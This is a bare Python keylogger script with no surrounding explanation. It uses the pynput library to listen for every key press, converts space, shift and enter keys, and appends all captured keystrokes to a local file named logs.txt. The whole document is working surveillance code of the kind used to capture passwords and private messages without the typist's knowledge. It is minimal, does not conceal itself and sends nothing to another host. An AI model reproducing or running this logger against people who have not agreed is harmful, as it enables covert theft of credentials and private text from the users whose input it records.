from pynput.keyboard import Listener

def log(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter in ['Key.shift_l', 'Key.shift_r']:
        letter = ''
    if letter == "Key.enter":
        letter = "\n"

    with open("logs.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=log) as l:
    l.join()